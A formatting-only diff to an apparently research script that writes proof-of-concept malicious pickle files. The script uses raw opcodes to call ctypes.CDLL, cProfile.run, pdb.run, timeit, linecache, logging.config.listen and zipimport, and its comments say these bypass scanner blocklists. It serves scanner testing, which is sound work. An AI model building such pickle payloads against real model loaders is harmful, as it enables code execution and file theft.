@@ -30,12 +30,12 @@ def write_poc(name: str, data: bytes, description: str):
     path = os.path.join(OUTPUT_DIR, f"{name}.pkl")
     with open(path, "wb") as f:
         f.write(data)
-    print(f"\n{'='*70}")
+    print(f"\n{'=' * 70}")
     print(f"POC: {name}")
     print(f"Description: {description}")
     print(f"File: {path}")
     print(f"Size: {len(data)} bytes")
-    print(f"{'='*70}")
+    print(f"{'=' * 70}")
     try:
         with open(path, "rb") as f:
             pickletools.dis(f)
@@ -56,6 +56,7 @@ def write_poc(name: str, data: bytes, description: str):
 # So ctypes.CDLL passes ALL checks!
 # ============================================================================
 
+
 def gen_poc25_ctypes_cdll():
     """ctypes.CDLL - load a malicious shared library."""
     buf = io.BytesIO()
@@ -70,8 +71,8 @@ def gen_poc25_ctypes_cdll():
     buf.write(struct.pack("<I", len(path)))
     buf.write(path)
     buf.write(b"\x85")  # TUPLE1
-    buf.write(b"R")     # REDUCE
-    buf.write(b".")     # STOP
+    buf.write(b"R")  # REDUCE
+    buf.write(b".")  # STOP
 
     write_poc(
         "poc25_ctypes_cdll",
@@ -93,6 +94,7 @@ def gen_poc25_ctypes_cdll():
 # Use a NON-suspicious string argument to verify the MODULE ITSELF bypasses.
 # ============================================================================
 
+
 def gen_poc26_cprofile_run():
     """cProfile.run executes arbitrary Python statements."""
     buf = io.BytesIO()
@@ -106,8 +108,8 @@ def gen_poc26_cprofile_run():
     buf.write(struct.pack("<I", len(cmd)))
     buf.write(cmd)
     buf.write(b"\x85")  # TUPLE1
-    buf.write(b"R")     # REDUCE
-    buf.write(b".")     # STOP
+    buf.write(b"R")  # REDUCE
+    buf.write(b".")  # STOP
 
     write_poc(
         "poc26_cprofile_run",
@@ -121,6 +123,7 @@ def gen_poc26_cprofile_run():
 # ============================================================================
 # POC 27: pdb.run - arbitrary Python code execution
 # ============================================================================
+
 
 def gen_poc27_pdb_run():
     """pdb.run executes arbitrary Python statements."""
@@ -149,6 +152,7 @@ def gen_poc27_pdb_run():
 # POC 28: timeit.timeit - arbitrary Python code execution
 # ============================================================================
 
+
 def gen_poc28_timeit():
     """timeit.timeit executes arbitrary Python statements."""
     buf = io.BytesIO()
@@ -174,6 +178,7 @@ def gen_poc28_timeit():
 # ============================================================================
 # POC 29: profile.run - arbitrary Python code execution
 # ============================================================================
+
 
 def gen_poc29_profile_run():
     """profile.run executes arbitrary Python statements."""
@@ -201,6 +206,7 @@ def gen_poc29_profile_run():
 # POC 30: _thread.start_new_thread - spawn thread with arbitrary function
 # ============================================================================
 
+
 def gen_poc30_thread():
     """_thread.start_new_thread spawns a thread with arbitrary function."""
     buf = io.BytesIO()
@@ -225,6 +231,7 @@ def gen_poc30_thread():
 # POC 31: ctypes.cast - pointer manipulation via ["*"] bug
 # ============================================================================
 
+
 def gen_poc31_ctypes_cast():
     """ctypes.cast for pointer manipulation."""
     buf = io.BytesIO()
@@ -244,6 +251,7 @@ def gen_poc31_ctypes_cast():
 # ============================================================================
 # POC 32: linecache.getline - arbitrary file read
 # ============================================================================
+
 
 def gen_poc32_linecache():
     """linecache.getline reads arbitrary file contents."""
@@ -269,6 +277,7 @@ def gen_poc32_linecache():
 # POC 33: logging.config.listen - open network listener
 # ============================================================================
 
+
 def gen_poc33_logging_listen():
     """logging.config.listen opens a network socket listener."""
     buf = io.BytesIO()
@@ -290,6 +299,7 @@ def gen_poc33_logging_listen():
 # POC 34: zipimport.zipimporter - module loading from ZIP
 # ============================================================================
 
+
 def gen_poc34_zipimport():
     """zipimport.zipimporter loads modules from ZIP files."""
     buf = io.BytesIO()
@@ -305,8 +315,7 @@ def gen_poc34_zipimport():
     write_poc(
         "poc34_zipimport",
         buf.getvalue(),
-        "zipimport.zipimporter() can load modules from attacker-controlled ZIP files. "
-        "Not in any blocklist.",
+        "zipimport.zipimporter() can load modules from attacker-controlled ZIP files. Not in any blocklist.",
     )
 
 
